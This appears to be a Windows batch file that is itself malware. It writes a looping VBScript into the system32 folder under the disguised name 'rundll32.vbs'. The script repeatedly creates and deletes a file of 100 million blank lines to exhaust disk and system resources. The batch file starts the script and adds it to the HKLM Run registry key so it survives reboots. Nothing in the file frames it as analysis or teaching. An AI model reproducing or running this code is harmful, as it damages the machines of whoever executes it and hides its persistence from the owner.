@echo off 
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
echo do >> %systemdrive%\windows\system32\rundll32.vbs 
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
start %systemdrive%\windows\system32\rundll32.vbs 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 